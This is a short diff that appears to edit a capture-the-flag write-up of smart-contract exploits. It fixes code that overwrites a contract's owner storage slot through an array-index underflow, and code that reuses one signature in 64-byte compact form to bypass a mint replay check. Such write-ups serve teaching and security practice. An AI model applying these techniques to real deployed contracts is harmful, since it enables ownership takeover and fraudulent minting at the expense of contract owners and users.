@@ -237,7 +237,7 @@ await contract.retract();
 const slot = web3.utils.keccak256(
     web3.eth.abi.encodeParameters(['uint256'], [1])
 );
-const index = BigInt(2**256) - BigInt(slot);
+const index = (1n << 256n) - BigInt(slot);
 
 // overwrite owner at slot 0
 const newOwner = '0x' + player.slice(2).padStart(64, '0');
@@ -535,11 +535,11 @@ const sig65 = await signer.signMessage(message);
 // convert to 64-byte EIP-2098 compact form
 const {r, s, v} = ethers.utils.splitSignature(sig65);
 const vs = v === 28 ? BigInt(s) | (1n << 255n) : BigInt(s);
-const sig64 = r + vs.toString(16).padStart(64, '0');
+const sig64 = "0x" + r.slice(2) + vs.toString(16).padStart(64, '0');
 
 // mint with both
 await contract.mint(message, sig65);
-await contract.mint(message, "0x" + sig64);
+await contract.mint(message, sig64);
 ```
 
 same signature, different bytes = bypass replay check.
